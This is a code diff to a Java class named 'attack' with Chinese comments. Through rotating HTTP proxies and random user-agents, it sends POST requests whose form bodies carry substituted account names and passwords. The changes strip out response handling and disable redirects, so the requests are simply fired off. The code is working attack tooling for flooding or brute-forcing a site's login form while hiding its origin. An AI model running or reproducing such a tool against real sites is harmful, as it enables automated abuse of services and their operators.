@@ -5,8 +5,6 @@ import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.net.URL;
 import java.util.Random;
-//import java.io.BufferedReader;
-//import java.io.InputStreamReader;
 
 public class attack implements Runnable {
     static String[] proxyhttp;
@@ -124,7 +122,7 @@ public class attack implements Runnable {
             // 设置是否使用缓存
             httpURLConnection.setUseCaches(false);
             // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
-            httpURLConnection.setInstanceFollowRedirects(true);
+            httpURLConnection.setInstanceFollowRedirects(false);
             // 设置请求头
             httpURLConnection.setRequestProperty("Content-Length", "40");
             httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
@@ -132,34 +130,16 @@ public class attack implements Runnable {
                     array.useragent[random.nextInt(array.useragent.length - 1)]);
             // 连接
             httpURLConnection.connect();
-            /* 4. 处理输入输出 */
             // 写入参数到请求中
             String param = file.param.replace("$[account]", name);
             param = param.replace("$[password]", pass);
             OutputStream out = httpURLConnection.getOutputStream();
             out.write(param.getBytes());
-            // 简化
-            // httpURLConnection.getOutputStream().write(params.getBytes());
             out.flush();
             out.close();
-            // 从连接中读取响应信息
-            // String msg = "";
-            // int code = httpURLConnection.getResponseCode();
-            // if (code == 200) {
-            // BufferedReader reader = new BufferedReader(
-            // new InputStreamReader(httpURLConnection.getInputStream()));
-            // String line;
-            // while ((line = reader.readLine()) != null) {
-            // msg += line + "\n";
-            // }
-            // reader.close();
-            // }
-            // 处理结果
-            // System.out.println(msg);
         } catch (IOException e) {
             System.out.println(surl + " 转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
         } finally {
-            // 5. 断开连接
             if (null != httpURLConnection) {
                 try {
                     httpURLConnection.disconnect();
